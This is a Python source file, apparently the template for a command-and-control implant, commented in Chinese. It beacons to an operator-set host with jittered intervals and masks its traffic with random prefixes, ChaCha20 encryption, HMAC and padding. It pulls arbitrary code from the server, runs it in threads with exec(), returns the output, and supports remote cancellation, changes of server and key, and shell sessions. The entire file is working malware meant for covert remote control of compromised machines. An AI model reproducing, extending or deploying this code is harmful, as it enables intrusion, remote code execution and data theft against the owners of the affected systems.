import socket as sock, struct as st, zlib as zl, random as rnd, time as tm, json as js, sys as sy, traceback as tb, io as io_, os as _osx, threading as thr, hashlib as hl, hmac as hmac_

# `secrets` 是 Python 3.6+ 模块, 而目标机常见 3.5 → 这里用 os.urandom 提供等价接口
# (token_bytes/token_hex/randbelow/choice), 调用点(sec.xxx)保持原样。
class _Sec:
    token_bytes = staticmethod(_osx.urandom)

    @staticmethod
    def token_hex(n=32):
        return _osx.urandom(n).hex()

    @staticmethod
    def randbelow(n):
        return int.from_bytes(_osx.urandom(16), "big") % n

    @staticmethod
    def choice(seq):
        return seq[int.from_bytes(_osx.urandom(16), "big") % len(seq)]

sec = _Sec()

MASTER_KEY = bytes({{XOR_KEY_BYTES}})
HOST = "{{HOST}}"
PORT = {{PORT}}
INTERVAL = {{INTERVAL}}
JITTER = {{JITTER}}
# 分段载荷(agent_stager)同 id 语义: 引导代码已把 id 存入全局 BEACON_ID 时
# 直接复用(否则 server 视新 id 为新 beacon, 会再次下发 stage 第二段, 二次
# exec 清空 _KNOWN/_PENDING/_ACTIVE 状态 + 泄漏线程, 2026-08-27 修复)
BEACON_ID = globals().get("BEACON_ID") or sec.token_hex(8)
BREAK_FLAG = False
CONN_KEY = MASTER_KEY

# ── 模块短名契约(D2): 植入端模块(set_host/set_key/fork/shell)与
# uplevel 升级代码(transport_base)依赖这些全局名,勿改 ──
_D = BEACON_ID            # 当前 beacon id
_H = HOST                 # server 地址(set_host 模块修改,connect_transport 读取)
_P = PORT                 # server 端口(set_host 模块修改,connect_transport 读取)
_K = MASTER_KEY           # 部署密钥(set_host 模块 key 参数修改)
_CK = MASTER_KEY          # 当前连接密钥(uplevel _disp 按通道层切换;cycle 每轮 CONN_KEY=_CK)
_B = BREAK_FLAG           # break 标志(主循环检查 _B)
# 回连间隔/抖动用 globals() 字符串键存储: 任务代码跑在**专用命名空间**里,
# 只有字符串键(与 _glb_API)能跨文件写回植入物状态(set_interval 模块写 _I/_J)
globals()["_I"] = INTERVAL
globals()["_J"] = JITTER

def _T():
    """连接函数(uplevel 升级代码覆盖 _T 实现多级回退通道)。"""
    return connect_transport()

# connect_transport 传输钩子: uplevel 升级代码可覆盖 _T/_H/_P/_K
def connect_transport():
    conn = sock.socket()
    conn.settimeout(30)
    conn.connect((_H, _P))
    # 混淆: TCP 首包 256B 随机前缀(服务端 handshake 吞掉;HTTPS/DNS 变体不走此)
    conn.sendall(sec.token_bytes(256))
    return conn

def qround(state, x, y, z, w):
    state[x] = (state[x] + state[y]) & 0xffffffff
    state[w] = ((state[w] ^ state[x]) << 16 | (state[w] ^ state[x]) >> 16) & 0xffffffff
    state[z] = (state[z] + state[w]) & 0xffffffff
    state[y] = ((state[y] ^ state[z]) << 12 | (state[y] ^ state[z]) >> 20) & 0xffffffff
    state[x] = (state[x] + state[y]) & 0xffffffff
    state[w] = ((state[w] ^ state[x]) << 8 | (state[w] ^ state[x]) >> 24) & 0xffffffff
    state[z] = (state[z] + state[w]) & 0xffffffff
    state[y] = ((state[y] ^ state[z]) << 7 | (state[y] ^ state[z]) >> 25) & 0xffffffff

def block(key, nonce, counter):
    state = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574] + list(st.unpack("<8I", key)) + [counter] + list(st.unpack("<3I", nonce))
    work = state[:]
    for _ in range(10):
        qround(work, 0, 4, 8, 12); qround(work, 1, 5, 9, 13)
        qround(work, 2, 6, 10, 14); qround(work, 3, 7, 11, 15)
        qround(work, 0, 5, 10, 15); qround(work, 1, 6, 11, 12)
        qround(work, 2, 7, 8, 13); qround(work, 3, 4, 9, 14)
    return st.pack("<16I", *[(work[i] + state[i]) & 0xffffffff for i in range(16)])

def xor_stream(data, key, nonce):
    buf = bytearray()
    counter = 0
    for i in range(0, len(data), 64):
        buf += bytes(u ^ v for u, v in zip(data[i:i + 64], block(key, nonce, counter)))
        counter += 1
    return bytes(buf)

def encode_frame_(data):
    # 帧封装: zlib→ChaCha20→HMAC→帧尾 0-255B 随机 padding+1B pad_len(混淆长度分布)
    compressed = zl.compress(data)
    enc, mac_key = hl.sha256(b"e" + CONN_KEY).digest(), hl.sha256(b"m" + CONN_KEY).digest()
    nonce = sec.token_bytes(12)
    ciphertext = xor_stream(compressed, enc, nonce)
    sealed = nonce + ciphertext + hmac_.new(mac_key, nonce + ciphertext, hl.sha256).digest()
    pad_len = rnd.randint(0, 255)
    return sealed + sec.token_bytes(pad_len) + bytes([pad_len])

def decode_frame_(data):
    pad_len = data[-1]
    if len(data) < 12 + 32 + 1 + pad_len:
        raise ValueError("bad frame")
    sealed = data[: -1 - pad_len]
    enc, mac_key = hl.sha256(b"e" + CONN_KEY).digest(), hl.sha256(b"m" + CONN_KEY).digest()
    nonce, ciphertext, tag = sealed[:12], sealed[12:-32], sealed[-32:]
    if not hmac_.compare_digest(tag, hmac_.new(mac_key, nonce + ciphertext, hl.sha256).digest()):
        raise ValueError("MAC")
    return zl.decompress(xor_stream(ciphertext, enc, nonce))

def _frame_mask():
    """长度头掩码(与 server core/protocol.frame_mask 一致,固定值)。"""
    return int.from_bytes(hl.sha256(CONN_KEY + b"len").digest()[:4], "big")

def send_frame(conn, data):
    encoded = encode_frame_(data)
    conn.sendall(st.pack(">I", len(encoded) ^ _frame_mask()) + encoded)

def recv_frame(conn):
    header = b""
    while 4 - len(header):
        chunk = conn.recv(4 - len(header))
        if not chunk:
            raise ConnectionError()
        header += chunk
    length = st.unpack(">I", header)[0] ^ _frame_mask()
    if length == 0:
        return b""
    payload = b""
    while length - len(payload):
        chunk = conn.recv(length - len(payload))
        if not chunk:
            raise ConnectionError()
        payload += chunk
    return decode_frame_(payload)

# ── 批量任务模型(v2): 本地并发执行 + 结果暂存 + 回连上报 ──
# 线程本地输出捕获: 多任务线程并发执行,print/sys.stdout 各进各的 buffer,
# 互不污染(替代旧模型的全局重定向 + PRINT_LOCK 串行)。
_TLS = thr.local()
_TLS_MAX_OUT = 400000   # 单条结果安全截断(帧上限 512KB 的余量,防撑爆整批)

class _ThreadStream:
    def __init__(self, kind):
        self._kind = kind
    def write(self, s):
        buf = getattr(_TLS, "buf", None)
        if buf is not None:
            buf[0 if self._kind == "out" else 1].write(str(s))
        else:
            (sy.__stdout__ if self._kind == "out" else sy.__stderr__).write(str(s))
    def flush(self):
        pass

sy.stdout = _ThreadStream("out")
sy.stderr = _ThreadStream("err")

_PENDING = {}        # task_id -> {"output": str, "error": str}(已完成、未获 ACK)
_PENDING_LOCK = thr.Lock()
_KNOWN = set()       # 已领取的 task_id(HTTPS/DNS 无状态通道可能重复下发,防重复执行)
_KNOWN_LOCK = thr.Lock()
_ACTIVE = {}         # task_id -> 线程(正在执行的任务,含持久任务;register 上报 running)
_ACTIVE_LOCK = thr.Lock()
_RECORDS = {}        # task_id -> {"output","error","ts"}(record 型任务: 只记录不上报)
_RECORDS_LOCK = thr.Lock()

# ── 任务执行隔离(D3): 下发代码不再与植入物共享命名空间 ──
# 每个任务拿到自己的一份 globals(浅拷贝)+ 显式接口 _glb_API。这样任务里
# `f=1`、`with open(...) as f:` 这类手写变量名再也顶不掉植入物运行时(此前
# 会覆盖植入物的模块/函数名, 下一步睡眠/收发就崩, 2026-09-28)。
# _glb_API 是植入物全局的"写穿透"视图: 读实时值、写直达植入物 → set_interval/
# sleep/shell/set_host 这些"改状态"的既有玩法一字不变; 任务里 globals() 也
# 指向 _glb_API(老写法 globals()["_I"]=30 继续生效)。任务私有变量只留在
# 自己那份拷贝里, 任务之间也不再互相污染。
_DENY_WRITE = ("_TLS", "_PENDING", "_PENDING_LOCK", "_KNOWN", "_KNOWN_LOCK",
               "_ACTIVE", "_ACTIVE_LOCK", "_RECORDS", "_RECORDS_LOCK", "_API")


class _ApiProxy:
    """任务代码读写植入物全局的统一入口(_glb_API)。"""

    __slots__ = ("_g",)

    def __init__(self, g):
        self._g = g

    def __getitem__(self, k):
        return self._g[k]

    def get(self, k, d=None):
        return self._g.get(k, d)

    def setdefault(self, k, d=None):
        return self._g.setdefault(k, d)

    def pop(self, k, *d):
        return self._g.pop(k, *d)

    def update(self, *a, **kw):
        return self._g.update(*a, **kw)

    def keys(self):
        return self._g.keys()

    def items(self):
        return self._g.items()

    def values(self):
        return self._g.values()

    def __contains__(self, k):
        return k in self._g

    def __iter__(self):
        return iter(self._g)

    def __len__(self):
        return len(self._g)

    def __setitem__(self, k, v):
        if k in _DENY_WRITE:
            raise KeyError("_glb_API: %r is managed by the implant, "
                           "tasks must not write it" % (k,))
        self._g[k] = v

    def __delitem__(self, k):
        if k in _DENY_WRITE:
            raise KeyError("_glb_API: %r is managed by the implant, "
                           "tasks must not delete it" % (k,))
        del self._g[k]

    def __repr__(self):
        return "<_glb_API %d entries>" % len(self._g)


_API = _ApiProxy(globals())


def _task_ns():
    """构造一个任务的执行命名空间(专用 globals, 见上面 D3 说明)。"""
    ns = dict(globals())
    ns["_glb_API"] = _API
    ns["globals"] = lambda: _API     # 老写法 globals()["_I"]=30 继续穿透
    return ns


class _TaskCancelled(BaseException):
    """任务被 stop 命令取消的标记异常(继承 BaseException,避免被任务代码的
    except Exception 吞掉;KeyboardInterrupt 会触发解释器 SIGINT 状态污染退出码)。"""
    pass

def _run_one_task(task_id, code, record=False):
    out_buf, err_buf = io_.StringIO(), io_.StringIO()
    _TLS.buf = (out_buf, err_buf)
    try:
        exec(code, _task_ns())      # 专用命名空间: 任务代码碰不到植入物运行时
    except _TaskCancelled:
        # 被 stop 命令取消: 静默退出, 不产生结果(线程结束由 finally 清 _ACTIVE)
        return
    except Exception:
        err_buf.write(tb.format_exc())
    finally:
        _TLS.buf = None
        with _ACTIVE_LOCK:
            _ACTIVE.pop(task_id, None)   # 执行结束(含被取消)移出运行中
    out, err = out_buf.getvalue(), err_buf.getvalue()
    if len(out) > _TLS_MAX_OUT:
        out = out[: _TLS_MAX_OUT] + "\n... (truncated, %d bytes total)" % len(out)
    if record:
        # record 型任务: 只记录本地(不上报), record 模块可查
        with _RECORDS_LOCK:
            _RECORDS[task_id] = {"output": out, "error": err, "ts": tm.time()}
        return
    with _PENDING_LOCK:
        _PENDING[task_id] = {"output": out, "error": err}
    _rush_sleep()   # 结果已入缓存 → 睡眠计数改小, 尽快回连上报(record 型不走这里)

def spawn_task(task_id, code, record=False):
    if not task_id:
        return
    with _KNOWN_LOCK:
        if task_id in _KNOWN:
            return  # 已领取过(重复下发),跳过
        _KNOWN.add(task_id)
    th = thr.Thread(target=_run_one_task, args=(task_id, code, record), daemon=True)
    with _ACTIVE_LOCK:
        _ACTIVE[task_id] = th
    th.start()

def _cancel_task(task_id):
    """终止指定运行中任务: 向任务线程异步抛 KeyboardInterrupt。

    Python 线程无法强制 kill,用 ctypes SetAsyncExc 在目标线程的字节码
    边界抛异常——`while True: pass` 类死循环可被打断;任务代码若全捕获
    BaseException 则无效(罕见)。阻塞在 socket.recv 的线程延迟到 IO 返回。
    被取消的任务线程退出时 _run_one_task 的 finally 清 _ACTIVE,不产生结果。
    """
    with _ACTIVE_LOCK:
        th = _ACTIVE.get(task_id)
    if th is None or not th.is_alive():
        return False
    try:
        import ctypes as _ct
        # 注意: SetAsyncExc 第二参必须传"异常类"(type), 传实例会报
        # SystemError: _PyErr_SetObject: exception ... is not a BaseException subclass
        _ct.pythonapi.PyThreadState_SetAsyncExc(
            _ct.c_long(th.ident), _ct.py_object(_TaskCancelled))
        return True
    except Exception:
        return False

def _handle_tasks(msg):
    """处理 TASKS 帧: acked 清理已确认结果 + tasks 去重领取。"""
    for tid in msg.get("acked") or []:
        with _PENDING_LOCK:
            _PENDING.pop(tid, None)
    for t in msg.get("tasks") or []:
        code = t.get("code", "")
        if code.startswith("!cancel "):
            _cancel_task(code[8:].strip())   # 任务终止指令(server stop 命令下发)
            continue
        spawn_task(t.get("task_id", ""), code, bool(t.get("record", False)))

def sleep_jitter():
    """回连间隔: I × uniform(1-J, 1+J),J = 构建参数 jitter(默认 0.2)。

    2026-09-16:jitter 此前是**死参数**(模块里只赋值 globals()["_J"],没人读,
    实际固定用 [0.75I, 1.5I])→ 现在真正生效,参数名实相符。
    J 收敛到 [0, 0.9]:J>=1 会让下限 <=0(可能 0 秒狂连),负数无意义;
    非法值(非数字)按 0 处理 = 固定间隔 I。
    读 globals() 字符串键(set_interval 模块写 _I;模块跑在专用命名空间里,
    字符串键是跨文件写状态的唯一通道)。
    """
    iv = globals().get("_I", INTERVAL)
    try:
        jt = min(max(float(globals().get("_J", JITTER)), 0.0), 0.9)
    except (TypeError, ValueError):
        jt = 0.0
    return rnd.uniform(iv * (1.0 - jt), iv * (1.0 + jt))

def _rush_sleep():
    """结果入缓存 → 把"当前睡眠计数"临时改成 5 秒 ±20%(2026-09-16)。

    · 5 秒与 ±20% 是写死的固定值, 不复用构建参数 jitter(两套节奏互不干扰);
    · 原先还剩的正常节奏若明显更长(>6 秒, 即短间隔上限 5×1.2)则存进"下一轮
      睡眠计数" _NXT —— 留到本次加速上报结束后接着睡, 整体节奏不被打乱;
      剩余 ≤6 秒就不存(否则 5 秒窗口内来的第二个结果会把较长的剩余覆盖掉);
    · 主循环每秒看一次 _SC, 所以最迟 1 秒后察觉、约 4~6 秒后回连上报。
    """
    try:
        cur = float(globals().get("_SC", 0) or 0)
    except (TypeError, ValueError):
        cur = 0.0
    if cur > 6.0:
        globals()["_NXT"] = cur
    globals()["_SC"] = 5.0 * rnd.uniform(0.8, 1.2)

def _wait():
    """睡眠: 每秒看一眼"当前睡眠计数" _SC——<=0 就返回去回连, 否则睡
    min(1s, _SC) 再减掉(粒度 1 秒, 不做精确计时;期间结果入队会把 _SC 改小)。

    _B(break 退出标志)或 _WAIT(长驻会话独占, 如 shell)置位时立即返回,
    免得"退出/会话接管"要等一整轮睡眠才生效。
    """
    while True:
        if globals().get("_B") or globals().get("_WAIT"):
            return
        try:
            rem = float(globals().get("_SC", 0) or 0)
        except (TypeError, ValueError):
            rem = 0.0
        if rem <= 0:
            return
        slice_ = 1.0 if rem > 1.0 else rem
        tm.sleep(slice_)
        try:
            cur = float(globals().get("_SC", 0) or 0)
        except (TypeError, ValueError):
            cur = 0.0
        globals()["_SC"] = cur - slice_

def cycle():
    global CONN_KEY
    conn = None
    ok = False
    try:
        conn = _T()          # 可能更新 _CK(_disp 连接成功设置层密钥)
        CONN_KEY = _CK       # 直连=_K(set_key 生效);uplevel 后=当前通道层密钥
        send_frame(conn, js.dumps({"type": "register", "version": 2, "role": "beacon", "id": BEACON_ID, "batch": True,
                                   "running": sorted(_ACTIVE)}).encode())
        while True:
            msg = js.loads(recv_frame(conn).decode())
            mtype = msg.get("type")
            if mtype == "welcome":
                ok = True  # 认证通过 = 新参数验证成功(set_host/key/port 钩子用)
                break
            if mtype == "error":
                return False
        # ① 上报已完成结果(逐条: 发一帧收一帧,收确认 + 顺带任务)
        with _PENDING_LOCK:
            pending = list(_PENDING.items())
        for task_id, res in pending:
            send_frame(conn, js.dumps({"type": "result", "task_id": task_id, "output": res["output"], "error": res["error"]}).encode())
            msg = js.loads(recv_frame(conn).decode())
            mtype = msg.get("type")
            if mtype == "tasks":
                _handle_tasks(msg)
            elif mtype in ("pong", "error"):
                return ok
            else:
                return ok
        # ② 请求并领取全部待执行任务(TASKS 帧可能多批,空批或 PONG 即取完)
        send_frame(conn, js.dumps({"type": "fetch"}).encode())
        while True:
            msg = js.loads(recv_frame(conn).decode())
            mtype = msg.get("type")
            if mtype == "tasks":
                _handle_tasks(msg)
                if not msg.get("tasks"):
                    break  # 空批 = 取完(agent 一问一答模式下 server 无更多任务)
            elif mtype in ("pong", "error"):
                break
        return ok
    except Exception:
        return False
    finally:
        if conn is not None:
            try:
                conn.close()
            except Exception:
                pass

# 主循环(2026-09-16 睡眠模型重写;不做旧码兼容):
#   _SC  = 当前睡眠计数(<=0 → 去回连);结果入缓存时被 _rush_sleep() 改成 5s±20%
#   _NXT = 下一轮睡眠计数(常规随机间隔 sleep_jitter();sleep 模块下发的暂停值写这里)
# 每轮: _wait() 睡到 _SC<=0 → cycle() 回连 → 回连结束(成功/失败统一处理)后按
# "下一轮计数"睡并重算下一轮;若仍有结果压着(本轮新产生/未确认)则继续短间隔再报。
# 两个变量用 globals() 字符串键(sleep 模块等跨文件写;任务在专用命名空间里跑).
globals()["_SC"] = 0                 # 启动即回连, 第一轮不等
globals()["_NXT"] = sleep_jitter()   # 下一轮睡眠计数(常规随机间隔)
while True:
    _wait()                          # 每秒看一眼 _SC;结果入队会把它改小
    if _B:
        break
    # _WAIT 独占回连: 长驻会话类模块(shell 等)在任务线程里自行
    # register 回连并置 globals()["_WAIT"]——主循环此时必须休眠,
    # 否则双循环(普通注册与增强会话注册交替, server 端 beacon 状态
    # 来回闪切, 2026-09-05 修复; _IN_SHELL 泛化为 _WAIT——任何模块
    # 置 _WAIT 即暂停主循环回连, 会话结束清掉即恢复)
    if globals().get("_WAIT"):
        tm.sleep(1.0)
        continue
    # set_host 验证钩子(host/port/key 合并模块): 新参数 pending 时本轮用新值回连,
    # 成功(welcome)即正式生效并清 pending; 失败计数, 连续 10 次失败回退
    # 旧参数(_SET_BACKUP 保存旧 host/port/key, 回退后 _H/_P/_K 恢复原值)。
    _sp = globals().get("_SET_PENDING")
    if _sp:
        if "_SET_BACKUP" not in globals():
            globals()["_SET_BACKUP"] = (_H, _P, _K)
        _H = _sp.get("host", _H)
        _P = _sp.get("port", _P)
        if "key" in _sp:
            _K = _sp["key"]
            _CK = _sp["key"]
    _ok = cycle()
    if _sp:
        if _ok:
            globals().pop("_SET_PENDING", None)
            globals().pop("_SET_BACKUP", None)
            globals().pop("_SET_TRY", None)
        else:
            _tr = globals().get("_SET_TRY", 0) + 1
            globals()["_SET_TRY"] = _tr
            if _tr >= 10:
                _H, _P, _K = globals()["_SET_BACKUP"]
                _CK = _K
                globals().pop("_SET_PENDING", None)
                globals().pop("_SET_BACKUP", None)
                globals().pop("_SET_TRY", None)
    # 回连完成(成功/失败统一): 还有结果没报出去 → 短间隔再连一次;
    # 都报完了 → 按"下一轮睡眠计数"睡, 同时重算下一轮(常规随机间隔)
    with _PENDING_LOCK:
        _has_pending = bool(_PENDING)
    if _has_pending:
        _rush_sleep()
    else:
        try:
            globals()["_SC"] = float(globals().get("_NXT", 0) or 0)
        except (TypeError, ValueError):
            globals()["_SC"] = 0
        globals()["_NXT"] = sleep_jitter()
